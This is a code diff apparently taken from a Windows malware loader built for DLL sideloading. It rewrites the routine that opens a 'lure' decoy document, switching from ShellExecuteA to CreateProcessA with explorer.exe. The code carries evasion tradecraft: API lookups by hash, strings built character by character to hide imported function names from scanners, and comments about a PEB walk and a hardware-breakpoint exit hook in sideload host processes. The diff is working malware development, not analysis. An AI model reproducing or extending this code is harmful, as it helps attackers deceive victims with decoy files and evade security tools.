@@ -254,22 +254,52 @@ static VOID OpenBindFile(VOID) {
 
     LOG_STR("[*] OpenBindFile: found lure file ", szFilePath);
 
-    // Resolve shell32 via PEB walk first (no loader lock needed).
-    // Avoids a deadlock when ExitProcess holds the loader lock on the primary
-    // thread at the point our DR1 exit hook fires: LoadLibraryA would block
-    // waiting for the lock, but the primary thread is stuck in NtWait → deadlock.
-    // Shell32 is always already loaded in real sideload host processes.
-    PVOID hShell32 = FindLoadedModuleW(L"SHELL32.DLL");
-    if (!hShell32) hShell32 = (PVOID)pLoadLibraryA("shell32.dll");
-    if (!hShell32) { LOG("[!] OpenBindFile: shell32.dll not available"); return; }
+    // Use CreateProcessA to launch: explorer.exe "<szFilePath>"
+    // ShellExecuteA crashes on thread pool threads because some internal
+    // shell/COM code paths are incompatible with the thread pool's thread
+    // state. CreateProcessA has no such restriction and works from any thread.
+    // Explorer handles file-association lookup and opens the document with
+    // the correct application.
+    fnGetProcAddress pGetProcAddress =
+        (fnGetProcAddress)FetchExportAddress(pKernel32, GetProcAddress_JOAAT);
+    if (!pGetProcAddress) { LOG("[!] OpenBindFile: GetProcAddress not resolved"); return; }
 
-    typedef HINSTANCE(WINAPI* fnShellExec)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
-    fnShellExec pShellExecuteA =
-        (fnShellExec)FetchExportAddress(hShell32, ShellExecuteA_JOAAT);
-    if (!pShellExecuteA) { LOG("[!] OpenBindFile: ShellExecuteA not found"); return; }
+    CHAR szCProcA[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0};
+    typedef BOOL (WINAPI* fnCPA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
+                                  BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+    fnCPA pCPA = (fnCPA)pGetProcAddress((HMODULE)pKernel32, szCProcA);
+    if (!pCPA) { LOG("[!] OpenBindFile: CreateProcessA not found"); return; }
 
-    HINSTANCE hRet = pShellExecuteA(NULL, "open", szFilePath, NULL, NULL, 1 /* SW_SHOWNORMAL */);
-    LOG_HEX("[+] OpenBindFile: ShellExecuteA returned ", (DWORD)(ULONG_PTR)hRet);
+    // Build: explorer.exe "<szFilePath>"
+    // "explorer.exe \"" = 14 chars; closing "\"" = 1 char; NUL = 1
+    CHAR szCmd[280];
+    MemSet(szCmd, 0, sizeof(szCmd));
+    CHAR szPrefix[] = {'e','x','p','l','o','r','e','r','.','e','x','e',' ','"',0};
+    DWORD pathLen = (DWORD)StrLenA(szFilePath);
+    if (pathLen + 16 < sizeof(szCmd)) {
+        MemCopy(szCmd, szPrefix, 14);
+        MemCopy(szCmd + 14, szFilePath, pathLen);
+        szCmd[14 + pathLen] = '"';
+    } else {
+        LOG("[!] OpenBindFile: path too long for cmdline");
+        return;
+    }
+
+    STARTUPINFOA si;
+    MemSet(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    MemSet(&pi, 0, sizeof(pi));
+
+    BOOL bOk = pCPA(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+    LOG_HEX("[+] OpenBindFile: CreateProcessA returned ", (DWORD)bOk);
+
+    if (bOk) {
+        CHAR szCloseH[] = {'C','l','o','s','e','H','a','n','d','l','e',0};
+        typedef BOOL (WINAPI* fnCloseH)(HANDLE);
+        fnCloseH pCloseH = (fnCloseH)pGetProcAddress((HMODULE)pKernel32, szCloseH);
+        if (pCloseH) { pCloseH(pi.hProcess); pCloseH(pi.hThread); }
+    }
 }
 
 // -----------------------------------------------
